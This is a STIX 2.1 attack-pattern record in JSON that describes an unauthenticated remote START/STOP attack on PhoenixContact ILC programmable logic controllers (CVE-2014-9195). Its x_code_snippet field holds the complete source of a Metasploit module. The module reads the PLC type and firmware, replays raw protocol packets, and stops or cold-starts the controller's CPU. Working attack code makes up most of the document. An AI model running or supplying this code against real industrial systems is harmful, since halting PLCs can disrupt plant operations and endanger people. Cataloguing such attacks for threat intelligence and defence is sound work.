{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d05afa32-b574-4f97-bf98-bb3eb584f4b8",
    "created": "2024-08-14T16:22:23.772384Z",
    "modified": "2024-08-14T16:22:23.772388Z",
    "name": "PhoenixContact PLC Remote START/STOP Command",
    "description": " PhoenixContact Programmable Logic Controllers are built upon a variant of ProConOS. Communicating using a proprietary protocol over ports TCP/1962 and TCP/41100 or TCP/20547. It allows a remote user to read out the PLC Type, Firmware and Build number on port TCP/1962. And also to read out the CPU State (Running or Stopped) AND start or stop the CPU on port TCP/41100 (confirmed ILC 15x and 17x series) or on port TCP/20547 (confirmed ILC 39x series) ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/scada/phoenix_command.rb",
            "external_id": "phoenix_command.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/tijldeneut/ICSSecurityScripts"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-9195"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Rex::Socket::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'PhoenixContact PLC Remote START/STOP Command',\n      'Version'       => '1',\n      'Description'   => %q{\n        PhoenixContact Programmable Logic Controllers are built upon a variant of\n        ProConOS. Communicating using a proprietary protocol over ports TCP/1962\n        and TCP/41100 or TCP/20547.\n        It allows a remote user to read out the PLC Type, Firmware and\n         Build number on port TCP/1962.\n        And also to read out the CPU State (Running or Stopped) AND start\n         or stop the CPU on port TCP/41100 (confirmed ILC 15x and 17x series)\n         or on port TCP/20547 (confirmed ILC 39x series)\n      },\n      'Author'         => 'Tijl Deneut <tijl.deneut[at]howest.be>',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'https://github.com/tijldeneut/ICSSecurityScripts' ],\n          [ 'CVE', '2014-9195']\n        ],\n      'DisclosureDate' => '2015-05-20'))\n    register_options(\n      [\n        OptEnum.new('ACTION', [true, 'PLC CPU action, REV means reverse current CPU state', 'NOOP',\n          [\n            'STOP',\n            'START',\n            'REV',\n            'NOOP'\n          ]]),\n        OptPort.new('RINFOPORT', [true, 'Set info port', 1962 ]),\n        OptPort.new('RPORT', [false, 'Set action port, will try autodetect when not set' ])\n      ], self.class\n    )\n  end\n\n  # Here comes the code, hang on to your pants\n  def bin_to_hex(s)\n    s.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join\n  end\n\n  def hex_to_bin(s)\n    s.scan(/../).map { |x| x.hex.chr }.join\n  end\n\n  def send_recv_once(data)\n    buf = ''\n    begin\n      sock.put(data)\n      buf = sock.get_once || ''\n    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e\n      elog(e)\n    end\n\n    bin_to_hex(buf)\n  end\n\n  def get_info(rhost, rport)\n    connect(true, 'RHOST' => rhost, 'RPORT' => rport)\n    data = send_recv_once(\"\\x01\\x01\\x00\\x1a\\x00^\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x0cIBETH01N0_M\\x00\")\n    if data.nil? || data.length < 36\n      print_error(\"Could not obtain information on this device\")\n      disconnect\n      return \"UNKNOWN\"\n    end\n    code = data[34..35]\n    send_recv_once(\"\\x01\\x05\\x00\\x16\\x00\\x5f\\x00\\x00\\x08\\xef\\x00\" + hex_to_bin(code) + \"\\x00\\x00\\x00\\x22\\x00\\x04\\x02\\x95\\x00\\x00\")\n    data = send_recv_once(\"\\x01\\x06\\x00\\x0e\\x00\\x61\\x00\\x00\\x88\\x11\\x00\" + hex_to_bin(code) + \"\\x04\\x00\")\n    disconnect\n    if data.nil? || data.length < 200\n      print_error(\"Could not obtain information on this device\")\n      return \"UNKNOWN\"\n    end\n    plctype = hex_to_bin(data[60..99])\n    print_status(\"PLC Type = \" + plctype)\n    print_status(\"Firmware = \" + hex_to_bin(data[132..139]))\n    print_status(\"Build    = \" + hex_to_bin(data[158..174]) + \" \" + hex_to_bin(data[182..199]))\n    print_status('------------------------------------')\n    plctype\n  end\n\n  def init_phase1\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x00/\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xcf\\xffAde.Remoting.Services.IProConOSControlService2\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x00.\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Ade.Remoting.Services.IProConOSControlService\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x00)\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Ade.Remoting.Services.IDataAccessService\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x00*\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd4\\xffAde.Remoting.Services.IDeviceInfoService2\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x00)\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Ade.Remoting.Services.IDeviceInfoService\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x00%\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd9\\xffAde.Remoting.Services.IForceService2\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x00$\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Ade.Remoting.Services.IForceService\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x000\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xce\\xffAde.Remoting.Services.ISimpleFileAccessService3\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x000\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Ade.Remoting.Services.ISimpleFileAccessService2\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x00*\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd4\\xffAde.Remoting.Services.IDeviceInfoService2\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x00)\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Ade.Remoting.Services.IDeviceInfoService\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x00*\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd4\\xffAde.Remoting.Services.IDataAccessService3\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x00)\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Ade.Remoting.Services.IDataAccessService\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x00*\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd4\\xffAde.Remoting.Services.IDataAccessService2\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x00)\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd5\\xffAde.Remoting.Services.IBreakpointService\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd6\\xffAde.Remoting.Services.ICallstackService\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x00%\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Ade.Remoting.Services.IDebugService2\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x00/\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xcf\\xffAde.Remoting.Services.IProConOSControlService2\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x00.\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Ade.Remoting.Services.IProConOSControlService\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x000\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xce\\xffAde.Remoting.Services.ISimpleFileAccessService3\\x00\")\n    send_recv_once(\"\\x01\\x00\\x00\\x00\\x00\\x000\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00Ade.Remoting.Services.ISimpleFileAccessService2\\x00\")\n    send_recv_once(\"\\x01\\x00\\x02\\x00\\x00\\x00\\x0e\\x00\\x03\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x12@\\x13@\\x13\\x00\\x11@\\x12\\x00\")\n  end\n\n  def init_phase2\n    send_recv_once(\"\\xcc\\x01\\x00\\r\\xc0\\x01\\x00\\x00\\xd5\\x17\")\n    send_recv_once(\"\\xcc\\x01\\x00\\x0b@\\x02\\x00\\x00G\\xee\")\n    send_recv_once(\"\\xcc\\x01\\x00[@\\x03\\x1c\\x00\\x01\\x00\\x00\\x00\\x1c\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xd7\\x9a\")\n    send_recv_once(\"\\xcc\\x01\\x00[@\\x04\\x1c\\x00\\x01\\x00\\x00\\x00\\x1c\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xeaC\")\n    send_recv_once(\"\\xcc\\x01\\x00\\x06@\\x05\\x00\\x006\\x1e\")\n    send_recv_once(\"\\xcc\\x01\\x00\\x07@\\x06\\x10\\x00&u\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc6\\x82\")\n  end\n\n  def get_state1(data)\n    if data[48..49] == '03'\n      state = 'RUN'\n    elsif data[48..49] == '07'\n      state = 'STOP'\n    elsif data[49..49] == '00'\n      state = 'ON'\n    else\n      print_error('CPU State not detected, full result is ' + data)\n      return\n    end\n    state\n  end\n\n  def get_state2(data)\n    if data[16..17] == '04'\n      state = 'STOP'\n    elsif data[16..17] == '02'\n      state = 'RUN'\n    else\n      print_error('CPU State not detected, full result is ' + data)\n      return\n    end\n    state\n  end\n\n  def get_cpu(rhost, rport, devicetype)\n    connect(true, 'RHOST' => rhost, 'RPORT' => rport)\n    state = 'unknown'\n    if devicetype == '15x'\n      init_phase1\n      ## KeepAlive packet\n      send_recv_once(\"\\x01\\x00\\x02\\x00\\x00\\x00\\x1c\\x00\\x03\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x07\\x00\\x05\\x00\\x06\\x00\\x08\\x00\\x10\\x00\\x02\\x00\\x11\\x00\\x0e\\x00\\x0f\\x00\\r\\x00\\x16@\\x16\\x00\")\n      ## Query packet\n      data = send_recv_once(\"\\x01\\x00\\x02\\x00\\x00\\x00\\x08\\x00\\x03\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x40\\x0b\\x40\")\n      state = get_state1(data)\n    elsif devicetype == '39x'\n      init_phase2\n      data = send_recv_once(\"\\xcc\\x01\\x00\\x0f@\\x07\\x00\\x00\\xea\\xfa\")\n      state = get_state2(data)\n    end\n    disconnect\n    print_status('CPU Mode = ' + state)\n    state\n  end\n\n  def set_cpu(rhost, rport, action, state, devicetype)\n    connect(true, 'RHOST' => rhost, 'RPORT' => rport)\n    if devicetype == '15x'\n      init_phase1 ## Several packets (21)\n      send_recv_once(\"\\x01\\x00\\x02\\x00\\x00\\x00\\x1c\\x00\\x03\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x07\\x00\\x05\\x00\\x06\\x00\\x08\\x00\\x10\\x00\\x02\\x00\\x11\\x00\\x0e\\x00\\x0f\\x00\\r\\x00\\x16@\\x16\\x00\")\n      if action == 'START' || (action == 'REV' && state == 'STOP')\n        print_status('--> Sending COLD start now')\n        send_recv_once(\"\\x01\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x01\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x01\\x00\")\n      else\n        print_status('--> Sending STOP now')\n        send_recv_once(\"\\x01\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x07\\x00\\x00\\x00\\x00\\x00\")\n      end\n    elsif devicetype == '39x'\n      init_phase2 ## Several packets (6)\n      if action == 'START' || (action == 'REV' && state == 'STOP')\n        print_status('--> Sending COLD start now')\n        send_recv_once(\"\\xcc\\x01\\x00\\x04\\x40\\x0e\\x00\\x00\\x18\\x21\")\n      else\n        print_status('--> Sending STOP now')\n        send_recv_once(\"\\xcc\\x01\\x00\\x01\\x40\\x0e\\x00\\x00\\x4c\\x07\")\n      end\n    else\n      print_error('Unknown device type')\n      return\n    end\n    sleep(1) ## It takes a second for a PLC to start\n    get_cpu(rhost, rport, devicetype)\n    disconnect\n  end\n\n  def run\n    rhost = datastore['RHOST']\n    action = datastore['ACTION']\n    ractionport = datastore['RPORT']\n\n    device = get_info(rhost, datastore['RINFOPORT'])\n\n    if device.start_with?('ILC 15', 'ILC 17')\n      devicetype = '15x'\n      print_status('--> Detected 15x/17x series, getting current CPU state:')\n      ractionport.nil? ? (rport = 41100) : (rport = ractionport)\n    elsif device.start_with?('ILC 39')\n      devicetype = '39x'\n      print_status('--> Detected 39x series, getting current CPU state:')\n      ractionport.nil? ? (rport = 20547) : (rport = ractionport)\n    else\n      print_error('Only ILC and (some) RFC devices are supported.')\n      return\n    end\n\n    state = get_cpu(rhost, rport, devicetype)\n    print_status('------------------------------------')\n\n    if action == \"NOOP\"\n      print_status(\"--> No action specified (#{action}), stopping here\")\n      return\n    end\n\n    set_cpu(rhost, rport, action, state, devicetype)\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-05-20"
}